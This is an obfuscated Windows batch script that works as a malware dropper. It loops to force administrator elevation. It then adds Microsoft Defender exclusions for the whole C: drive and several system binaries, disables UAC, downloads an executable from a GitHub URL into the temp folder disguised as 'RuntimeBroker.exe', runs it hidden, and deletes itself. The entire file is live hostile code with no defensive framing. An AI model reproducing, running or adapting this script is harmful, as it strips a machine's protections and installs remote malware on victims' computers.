@echo off & setlocal enableDelayedExpansion
set "BaOR=2>&1" & set "UMpzz=NET" & set "ELtNI=SESSION" & set "SntO=>nul"
%UMpzz% %ELtNI% %SntO% %BaOR%
set "e=!errorlevel!" & set "a=:A" & set "b=:B"
if !e! equ 0 (goto %a%) else (goto %b%)

:A
set "DrJ=baz" & set "cyJY=qux" & set "JXipm=bar" & set "YBc=foo" & rem zQusa yMy KGUNwg
set "jcrAD=powershell -ExecutionPolicy Bypass -Command"
set "HcUt=[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; Add-MpPreference -ExclusionPath"
set "islUZ='C:\', 'C:\cmd.exe', 'C:\conhost.exe', 'C:\cvtres.exe', 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSbuild.exe',"
set "nmw='C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', 'C:\Windows\System32\Wscript.exe' -ErrorAction SilentlyContinue"
!jcrAD! "!HcUt! !islUZ! !nmw!" %SntO% %BaOR%
set "QUL=Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'"
set "rNot=-Name 'EnableLUA' -Value 0"
!jcrAD! "!QUL! !rNot!" %SntO% %BaOR%
set "hTA=if ((Get-MpPreference -ErrorAction SilentlyContinue).ExclusionPath -contains 'C:\') { exit 0 } else { exit 1 } "
!jcrAD! "!hTA!" %SntO% %BaOR%
if !errorlevel! neq 0 (goto %a%)
set "ccSB=timeout /t" & !ccSB! 2 %SntO% %BaOR%
set "yQQ=$ProgressPreference = 'SilentlyContinue'; $ErrorActionPreference = 'SilentlyContinue';"
set "zZc=Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56/raw/main/kamzat.exe'"
set "mbxH=-OutFile '%TEMP%\RuntimeBroker.exe' -UseBasicParsing"
!jcrAD! "!yQQ! !zZc! !mbxH!" %SntO% %BaOR%

:W
if not exist "%TEMP%\RuntimeBroker.exe" (!ccSB! 1 %SntO% %BaOR% & goto :W)
start "" /B "%TEMP%\RuntimeBroker.exe" %SntO% %BaOR%
del /f /q "%~f0" %SntO% %BaOR%
exit /b

:B
set "h=powershell -WindowStyle Hidden -Command"
set "j1=Start-Process -WindowStyle Hidden -FilePath '%~f0' -Verb RunAs"
!h! "!j1!" %SntO% %BaOR%
if !errorlevel! neq 0 (!ccSB! 3 %SntO% %BaOR% & goto %b%)
exit /b
